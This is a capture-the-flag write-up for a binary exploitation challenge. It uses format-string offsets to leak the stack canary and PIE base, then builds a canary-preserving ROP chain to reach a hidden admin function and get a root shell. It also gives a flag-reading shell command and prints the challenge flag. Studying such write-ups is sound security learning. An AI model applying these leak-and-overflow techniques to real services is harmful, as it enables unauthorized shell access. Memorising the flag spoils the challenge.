# Blinded_new

## Challenge Type

`pwn`

## Summary

The service exposes two useful bugs:

- `1. Log a note` is a format-string bug, so stack values can be leaked.
- `2. Enter secret info` reads `0xc8` bytes into a `0x40` stack buffer, so it is a stack overflow with a canary.

The blind logger is enough to recover the stack canary, the saved frame pointer, and one PIE leak. After that, the overflow can return into the hidden admin function.

## Recon

The following stack slots were stable on the live service:

- `%53$p` -> stack canary
- `%54$p` -> saved `rbp`
- `%62$p` -> `_start`

Using `%62$p`, the PIE base is:

```text
base = leaked_start - 0x11c0
```

From the earlier blind code recovery, the useful code offsets are:

- hidden admin function: `base + 0x12a9`
- single `ret` gadget: `base + 0x12d1`

The overflow layout is:

```text
56 bytes buffer
8 bytes canary
8 bytes saved rbp
8 bytes saved rip
```

## Exploit

The first attempt was to return directly to the hidden admin function. That only printed:

```text
ADMIN ACCESS GRANTED!
```

The missing piece was stack alignment. Returning through a single `ret` first fixes the alignment for the function that the admin routine calls with `"/bin/sh"`.

Final ROP chain:

```python
b"A" * 56 +
p64(canary) +
p64(saved_rbp) +
p64(base + 0x12d1) +
p64(base + 0x12a9)
```

After the aligned jump, the service provides a root shell over the socket. Running:

```sh
cat /flag* /home/*/flag* 2>/dev/null
```

returns the flag.

## Flag

```text
VishwaCTF{adm1n_c0ns0le_0v3rr1d3_e8cda895}
```
